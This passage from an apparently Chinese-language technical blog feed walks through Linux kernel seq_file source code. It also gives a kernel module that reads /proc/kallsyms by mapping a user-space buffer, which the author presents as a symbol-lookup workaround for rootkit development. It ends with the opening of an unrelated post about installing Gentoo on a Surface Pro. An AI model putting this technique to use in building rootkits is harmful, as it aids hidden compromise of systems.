class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> offset)</span><br>&#123;<br><span class="hljs-type">loff_t</span> pos = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> error = <span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> *p;<br><br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = m-&gt;from = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!offset)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (!m-&gt;buf) &#123;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">return</span> -ENOMEM;<br>&#125;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br><span class="hljs-keyword">while</span> (p) &#123;<br>error = PTR_ERR(p);<br><span class="hljs-keyword">if</span> (IS_ERR(p))<br><span class="hljs-keyword">break</span>;<br>error = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (error &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (unlikely(error)) &#123;<br>error = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (seq_has_overflowed(m))<br><span class="hljs-keyword">goto</span> Eoverflow;<br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">if</span> (pos + m-&gt;count &gt; offset) &#123;<br>m-&gt;from = offset - pos;<br>m-&gt;count -= m-&gt;from;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>pos += m-&gt;count;<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (pos == offset)<br><span class="hljs-keyword">break</span>;<br>&#125;<br>m-&gt;op-&gt;stop(m, p);<br><span class="hljs-keyword">return</span> error;<br><br>Eoverflow:<br>m-&gt;op-&gt;stop(m, p);<br>kvfree(m-&gt;buf);<br>m-&gt;count = <span class="hljs-number">0</span>;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size &lt;&lt;= <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> !m-&gt;buf ? -ENOMEM : -EAGAIN;<br>&#125;<br></code></pre></td></tr></table></figure><p>回到 <code>seq_read_iter()</code> ，接下来首先检查 <code>buf</code> 是否分配，之后检查 <code>buf</code> 上是否有数据 <code>m-&gt;count != 0</code> ，若是则拷贝到 <code>iovec</code> 所指示的内存上：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* grab buffer if we didn&#x27;t have one */</span><br><span class="hljs-keyword">if</span> (!m-&gt;buf) &#123;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size = PAGE_SIZE);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">goto</span> Enomem;<br>&#125;<br><span class="hljs-comment">// something left in the buffer - copy it out first</span><br><span class="hljs-keyword">if</span> (m-&gt;count) &#123;<br>n = copy_to_iter(m-&gt;buf + m-&gt;from, m-&gt;count, iter);<br>m-&gt;count -= n;<br>m-&gt;from += n;<br>copied += n;<br><span class="hljs-keyword">if</span> (m-&gt;count)<span class="hljs-comment">// hadn&#x27;t managed to copy everything</span><br><span class="hljs-keyword">goto</span> Done;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后是预检查部分，作用是 <strong>进行一次读取，并检查缓冲区大小是否足够</strong> ：</p><ul><li>首先初始化序列文件临时缓冲区的起始偏移为 0，调用 <code>op-&gt;start()</code>  进行初始化，然后进入读取循环：<ul><li>首先调用 <code>op-&gt;show()</code> 打印当前序列数据对象到临时缓冲区，若跳过（如 <code>SEQ_SKIP</code> ）则当前轮的读取长度（ <code>m-&gt;count</code> ）记为 <code>0</code> ，并开始下轮循环</li><li>若临时缓冲区<strong>未满</strong> ，跳到 Fill 标签 <strong>开始正式的继续读取</strong> ，否则调用 <code>op-&gt;stop()</code> 停止并<strong>重新分配一个更大的缓冲区</strong>，之后重新读取当前序列数据对象</li></ul></li><li>若正常退出循环（break），说明读取失败，调用 <code>op-&gt;stop()</code> 停止并直接跳到 <code>Done</code> 标签进行收尾</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// get a non-empty record in the buffer</span><br>m-&gt;from = <span class="hljs-number">0</span>;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>err = PTR_ERR(p);<br><span class="hljs-keyword">if</span> (!p || IS_ERR(p))<span class="hljs-comment">// EOF or an error</span><br><span class="hljs-keyword">break</span>;<br>err = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">// hard error</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (unlikely(err))<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (unlikely(!m-&gt;count)) &#123; <span class="hljs-comment">// empty record</span><br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (!seq_has_overflowed(m)) <span class="hljs-comment">// got it</span><br><span class="hljs-keyword">goto</span> Fill;<br><span class="hljs-comment">// need a bigger buffer</span><br>m-&gt;op-&gt;stop(m, p);<br>kvfree(m-&gt;buf);<br>m-&gt;count = <span class="hljs-number">0</span>;<br>m-&gt;buf = seq_buf_alloc(m-&gt;size &lt;&lt;= <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!m-&gt;buf)<br><span class="hljs-keyword">goto</span> Enomem;<br>p = m-&gt;op-&gt;start(m, &amp;m-&gt;index);<br>&#125;<br><span class="hljs-comment">// EOF or an error</span><br>m-&gt;op-&gt;stop(m, p);<br>m-&gt;count = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">goto</span> Done;<br></code></pre></td></tr></table></figure><p>接下来就是核心的数据读取部分了：</p><ul><li>核心还是一个读取循环，不过前面预读取时已经 <code>start()</code> 过了所以这里直接开始读取：<ul><li>首先直接调用 <code>op-&gt;next()</code> 获取下一个序列数据对象（因为前面已经读过一次了），若开发者定义的该函数没有更新 <code>m-&gt;index</code> 则会手动自增，获取出错则跳出循环</li><li>若缓冲区上已有数据量大于 iovec 迭代器剩余量（<code>iov_iter_count(iter)</code>）则跳出循环</li><li>调用 <code>op-&gt;show()</code> 将新获取到的序列数据对象打印到缓冲区上，若溢出则跳出循环，注意这里的 <code>offs</code> 记录的是当前次循环开始前的 <code>m-&gt;count</code></li></ul></li><li>接下来调用 <code>op-&gt;stop()</code> 停止，并调用 <code>copy_to_iter()</code> 将临时缓冲区上数据拷贝到 iovec 迭代器所指示的 iovec 所指示的内存上</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">Fill:<br><span class="hljs-comment">// one non-empty record is in the buffer; if they want more,</span><br><span class="hljs-comment">// try to fit more in, but in any case we need to advance</span><br><span class="hljs-comment">// the iterator once for every record shown.</span><br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br><span class="hljs-type">size_t</span> offs = m-&gt;count;<br><span class="hljs-type">loff_t</span> pos = m-&gt;index;<br><br>p = m-&gt;op-&gt;next(m, p, &amp;m-&gt;index);<br><span class="hljs-keyword">if</span> (pos == m-&gt;index) &#123;<br>pr_info_ratelimited(<span class="hljs-string">&quot;buggy .next function %ps did not update position index\n&quot;</span>,<br>    m-&gt;op-&gt;next);<br>m-&gt;index++;<br>&#125;<br><span class="hljs-keyword">if</span> (!p || IS_ERR(p))<span class="hljs-comment">// no next record for us</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (m-&gt;count &gt;= iov_iter_count(iter))<br><span class="hljs-keyword">break</span>;<br>err = m-&gt;op-&gt;show(m, p);<br><span class="hljs-keyword">if</span> (err &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// -&gt;show() says &quot;skip it&quot;</span><br>m-&gt;count = offs;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (err || seq_has_overflowed(m)) &#123;<br>m-&gt;count = offs;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>m-&gt;op-&gt;stop(m, p);<br>n = copy_to_iter(m-&gt;buf, m-&gt;count, iter);<br>copied += n;<br>m-&gt;count -= n;<br>m-&gt;from = n;<br></code></pre></td></tr></table></figure><p>最后就是一些常规的收尾工作，例如在序列文件与 kiocb 中记录拷贝的字节数等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">Done:<br><span class="hljs-keyword">if</span> (unlikely(!copied)) &#123;<br>copied = m-&gt;count ? -EFAULT : err;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>iocb-&gt;ki_pos += copied;<br>m-&gt;read_pos += copied;<br>&#125;<br>mutex_unlock(&amp;m-&gt;lock);<br><span class="hljs-keyword">return</span> copied;<br>Enomem:<br>err = -ENOMEM;<br><span class="hljs-keyword">goto</span> Done;<br>&#125;<br>EXPORT_SYMBOL(seq_read_iter);<br></code></pre></td></tr></table></figure><p>不难看出序列文件接口的读取实现其实非常的简洁</p><h2 id="seq-lseek-：序列文件偏移操作"><a href="#seq-lseek-：序列文件偏移操作" class="headerlink" title="seq_lseek()：序列文件偏移操作"></a>seq_lseek()：序列文件偏移操作</h2><p>这个函数比较简洁，主要就是移动当前的序列文件偏移，对于相对偏移值（<code>SEEK_CUR</code> 路径）会先转换成绝对偏移值，进行偏移值计算的路径归一化，偏移值移动则主要靠 <code>traverse()</code> 完成，前文已经讲过故这里不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_lseek -序列文件的 -&gt;llseek() 方法</span><br><span class="hljs-comment"> *@file: the file in question</span><br><span class="hljs-comment"> *@offset: 新的偏移值</span><br><span class="hljs-comment"> *@whence: 0 for 绝对值, 1 for 相对位置</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Ready-made -&gt;f_op-&gt;llseek()</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">loff_t</span> <span class="hljs-title function_">seq_lseek</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">loff_t</span> offset, <span class="hljs-type">int</span> whence)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> file-&gt;private_data;<br><span class="hljs-type">loff_t</span> retval = -EINVAL;<br><br>mutex_lock(&amp;m-&gt;lock);<br><span class="hljs-keyword">switch</span> (whence) &#123;<br><span class="hljs-keyword">case</span> SEEK_CUR:<br>offset += file-&gt;f_pos;<br>fallthrough;<br><span class="hljs-keyword">case</span> SEEK_SET:<br><span class="hljs-keyword">if</span> (offset &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>retval = offset;<br><span class="hljs-keyword">if</span> (offset != m-&gt;read_pos) &#123;<br><span class="hljs-keyword">while</span> ((retval = traverse(m, offset)) == -EAGAIN)<br>;<br><span class="hljs-keyword">if</span> (retval) &#123;<br><span class="hljs-comment">/* with extreme prejudice... */</span><br>file-&gt;f_pos = <span class="hljs-number">0</span>;<br>m-&gt;read_pos = <span class="hljs-number">0</span>;<br>m-&gt;index = <span class="hljs-number">0</span>;<br>m-&gt;count = <span class="hljs-number">0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>m-&gt;read_pos = offset;<br>retval = file-&gt;f_pos = offset;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>file-&gt;f_pos = offset;<br>&#125;<br>&#125;<br>mutex_unlock(&amp;m-&gt;lock);<br><span class="hljs-keyword">return</span> retval;<br>&#125;<br>EXPORT_SYMBOL(seq_lseek);<br></code></pre></td></tr></table></figure><h2 id="seq-release-：关闭序列文件"><a href="#seq-release-：关闭序列文件" class="headerlink" title="seq_release()：关闭序列文件"></a>seq_release()：关闭序列文件</h2><p>这个函数主要是进行释放内存的收尾工作，不再赘叙：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *seq_release -free the structures associated with sequential file.</span><br><span class="hljs-comment"> *@file: file in question</span><br><span class="hljs-comment"> *@inode: its inode</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *Frees the structures associated with sequential file; can be used</span><br><span class="hljs-comment"> *as -&gt;f_op-&gt;release() if you don&#x27;t have private data to destroy.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">seq_release</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">m</span> =</span> file-&gt;private_data;<br>kvfree(m-&gt;buf);<br>kmem_cache_free(seq_file_cache, m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(seq_release);<br></code></pre></td></tr></table></figure><p>对于 <code>__seq_open_private()</code> ，也有一个对应的关闭函数 <code>seq_release_private()</code> ，同样是在 <code>seq_release()</code> 上的 wrapper，不过会帮你释放掉 <code>seq_file::private</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">seq_release_private</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> inode *inode, <span class="hljs-keyword">struct</span> file *file)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> *<span class="hljs-title">seq</span> =</span> file-&gt;private_data;<br><br>kfree(seq-&gt;private);<br>seq-&gt;private = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> seq_release(inode, file);<br>&#125;<br>EXPORT_SYMBOL(seq_release_private);<br></code></pre></td></tr></table></figure><blockquote><p>至此序列文件接口的实现基本完结，可以看到这个实现其实非常的简洁，这个场景在内核中其实非常常见（例如读取各种内核对象的信息），对于开发者而言并不需要每个场景都手写一套，因此通用的序列文件接口应运而生</p></blockquote><h1 id="0x03-序列文件接口-其他"><a href="#0x03-序列文件接口-其他" class="headerlink" title="0x03. 序列文件接口 - 其他"></a>0x03. 序列文件接口 - 其他</h1><p>序列文件接口其实没啥更多能讲的东西了，这一节主要记录一些比较零碎的迷思</p><h2 id="在内核中读取特殊序列文件"><a href="#在内核中读取特殊序列文件" class="headerlink" title="在内核中读取特殊序列文件"></a>在内核中读取特殊序列文件</h2><!--因为序列文件接口被开发出来的目的便是为了向用户空间导出内核数据，因此在内核空间读取序列文件在设计初期并没有被考虑到， 所以数据拷贝使用的是 AIO 接口的 `copy_to_iter()` ，**仅用来将数据从内核空间拷贝到用户空间** ，因此你无法通过 `kernel_read()` 这样的 API 来读取这类文件--><p>部分的序列文件接口对于内核空间是不可以使用 <code>kernel_read()</code> 进行读取的，因为其文件函数表实现的是 <code>read()</code> 接口而非 <code>read_iter()</code> 接口，但是实战开发中我们往往又需要在内核空间读取一些序列文件，这通常是因为这一部分内核数据的获取接口并不对内核驱动导出，但留有向用户空间导出的序列文件接口，此时序列文件接口便几乎是我们唯一的数据获取方式</p><blockquote><p>例如在 rootkit 开发当中我们通常需要获取各种内核符号的地址，但对应的获取内核符号的内核接口 <code>kallsyms_lookup_name()</code> 在内核版本 <code>5.7.0</code> 后默认不再导出，因此我们只能通过读取 <code>/proc/kallsyms</code>  进行获取</p></blockquote><p>解决的方案其实很简单： <strong>我们只需要分配一块属于用户空间的临时内存即可</strong> ，这可以通过 <code>vm_mmap() &amp; vm_munmap()</code> 完成，下面是一个简单的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/fs.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mm.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mman.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">filp</span>;</span><br>    <span class="hljs-type">char</span> __user *ubuf;<br>    <span class="hljs-type">char</span> *kbuf;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">ssize_t</span> read_len;<br>    <span class="hljs-type">loff_t</span> fpos;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello to kernel space!\n&quot;</span>);<br><br>    ubuf = (<span class="hljs-type">void</span>*) vm_mmap(<span class="hljs-literal">NULL</span>,<br>                           <span class="hljs-number">0</span>,<br>                           PAGE_SIZE,<br>                           PROT_READ | PROT_WRITE,<br>                           MAP_ANONYMOUS | MAP_PRIVATE,<br>                           <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!ubuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to allocate userspace buf!\n&quot;</span>);<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> out_ret;<br>    &#125;<br><br>    filp = filp_open(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, O_RDONLY, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (IS_ERR(filp)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to open file! Error code: %ld\n&quot;</span>,<br>               PTR_ERR(filp));<br>        ret = PTR_ERR(filp);<br>        <span class="hljs-keyword">goto</span> out_free_ubuf;<br>    &#125;<br><br>    kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);<br>    <span class="hljs-keyword">if</span> (!kbuf) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to allocate kernelspace buf!\n&quot;</span>);<br>        ret = -ENOMEM;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br>    <span class="hljs-built_in">memset</span>(kbuf, <span class="hljs-number">0</span>, PAGE_SIZE);<br><br>    fpos = <span class="hljs-number">0</span>;<br>    read_len = filp-&gt;f_op-&gt;read(filp, ubuf, PAGE_SIZE, &amp;fpos);<br>    filp-&gt;f_pos = fpos;<br>    <span class="hljs-keyword">if</span> (read_len &lt; <span class="hljs-number">0</span>) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to read file! Error code: %ld\n&quot;</span>,<br>              read_len);<br>        ret = read_len;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (copy_from_user(kbuf, ubuf, read_len)) &#123;<br>        printk(KERN_ERR <span class="hljs-string">&quot;[a3kmod:] FAILED to copy data to kernel!\n&quot;</span>);<br>        ret = -EFAULT;<br>        <span class="hljs-keyword">goto</span> out_close_file;<br>    &#125;<br><br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Got data: %s\n&quot;</span>, kbuf);<br><br>out_close_file:<br>    filp_close(filp, <span class="hljs-literal">NULL</span>);<br>out_free_ubuf:<br>    vm_munmap((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) ubuf, PAGE_SIZE);<br>out_ret:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __exit <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye to kernel space!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br></code></pre></td></tr></table></figure><p>成功读取 <code>/proc/kallsyms</code> 文件：</p><p><img src="https://s2.loli.net/2024/06/03/juGzqY8l1DJUeiK.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;真是序序又列列啊，你们有没有这样的文件接口啊我想问&lt;/p&gt;</summary>
    
    
    
    <category term="OS" scheme="https://arttnba3.github.io/categories/OS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="操作系统" scheme="https://arttnba3.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="文件系统" scheme="https://arttnba3.github.io/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="序列文件接口" scheme="https://arttnba3.github.io/tags/%E5%BA%8F%E5%88%97%E6%96%87%E4%BB%B6%E6%8E%A5%E5%8F%A3/"/>
    
  </entry>
  
  <entry>
    <title>【DISTRO.0x02】在 Surface Pro 8 上安装 Gentoo</title>
    <link href="https://arttnba3.github.io/2024/04/30/DISTRO-0X02-SURFACE_INSTALL_GENTOO_WINDOWS/"/>
    <id>https://arttnba3.github.io/2024/04/30/DISTRO-0X02-SURFACE_INSTALL_GENTOO_WINDOWS/</id>
    <published>2024-04-29T19:23:41.000Z</published>
    <updated>2024-05-14T17:07:21.374Z</updated>
    
    <content type="html"><![CDATA[<p>省流：最后装回了 openSUSE Tumbleweed</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><blockquote><p>熟悉的废话环节，可以直接跳过不看：）</p></blockquote><p>熟悉笔者的朋友都知道笔者是一个微软死忠粉（ <del>虽然这位微软死忠粉现在并没有在将由微软开发的操作系统作为主力</del> ），因此手上自然而然会有一些 Surface 设备（当然绝大部分都出二手回血了，👴只能说学生时代缺钱的穷 b 是这样的），恰好笔者手边有一台闲置的 Surface Pro 8 设备，而 Surface 从这一代设备开始有一个支持方便快捷地自行更换硬盘的设计，同时笔者原有的设备是最低配的版本 （8G 运存 + 128G 存储），因此笔者就想把这台陪伴了笔者大四期间多个夜晚的设备（因为晚上宿舍断电，所以有这样一台续航长的办公本还是很重要的， <del>当然这里肯定有人要问为什么不用 macbook 了，虽然说 mac 的续航时间确实比 Windows 阵营任何的笔记本要长得多，但是笔者当时并没有钱能够买得起哪怕是一台二手的 macbook，而且既然都买 macbook 了再买二手未免有些寒碜，可能有人又会抬杠说 Surface 都买了怎么买不起 macbook，毕竟最低配的 Surface 价格终究是比最低配的 macbook 要便宜不少，同时还有一个比较重要的原因便是笔者此前很多工作还是需要在 X86 平台上完成，mac 下虽然有 Rosetta 或是 Parallel，但是转译终究还是会带来一定的性能损耗，而且使用起来并不优雅，那这里可能又会有人问为什么不买联想或是其他牌子的同价位办公本，那👴只能说田牌就是信仰</del> ）给简单升级一下，在替换大容量硬盘的同时顺便装一个 Windows + Linux 双系统，<strong>前者是为了保留原汁原味的 Surface 体验，后者则是纯粹为了瞎折腾</strong>：）</p><p>出于各种因素的考虑（ 